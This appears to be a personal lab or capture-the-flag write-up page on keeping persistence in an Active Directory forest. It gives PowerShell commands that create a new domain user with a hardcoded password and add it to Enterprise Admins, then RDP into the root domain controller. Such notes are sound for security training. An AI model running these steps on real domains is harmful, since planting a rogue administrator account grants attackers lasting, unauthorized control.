In order to maintain persistence, and allowing us to login without creating tickets, we can create a new user and add it to **Enterprise Admins** group, using the following PowerShell code:

## Connect to CORPDC with Administration credentials

[[Connect to CORP.DC with Administration credentials]]

## Adding a new user as an Enterprise Admin

PS C:\Users\Administrator>`$pwd = convertTo-SecureString "Capstone1@" -AsPlainText -Force`

PS C:\Users\Administrator>`New-ADUser -Name "kairosroot" -AccountPassword $pwd `

PS C:\Users\Administrator>`$User = Get-ADUser -Identity "kairosroot"  -Server "corpdc.corp.thereserve.loc"`

PS C:\Users\Administrator>`$Group = Get-ADGroup -Identity "Enterprise Admins" -Server "rootdc.thereserve.loc"`

PS C:\Users\Administrator>`Add-ADGroupMember -Identity $Group -Members $User -Server "rootdc.thereserve.loc"`

![[Maintain persistence-20240613153305218.webp]]

## Check out the user and group

<span style="background:#d4b106">CHANGE IMAGES</span>

PS C:\Users\Administrator> `echo $user`

![[Maintain persistence-20240613153842909.webp]]

PS C:\Users\Administrator> `echo $group`

![[Maintain persistence-20240613153950655.webp]]


## RDP to ROOTDC

With our new created user, we can just login in the ROOTDC as an Enterprise Admin.

### Connecting from a Client Machine

1. **Open Remote Desktop Connection**:
    
    - Press `Win + R`, type `mstsc`, and press `Enter`.
    - ![[Maintain persistence-20240615154522456.webp]]
1. **Enter the Host Machine’s Name or IP Address**:
    
    - In the Remote Desktop Connection window, enter the computer name or IP address of the host machine.
3. **Enter Credentials**:
    
    - When prompted, enter the username and password for the account on the host machine.
4. **Optional: Save Connection Settings**:
    
    - You can save the connection settings to an RDP file by clicking on **Show Options** > **Save As**.
5. **Connect**:
    
    - Click **Connect** to start the remote session.

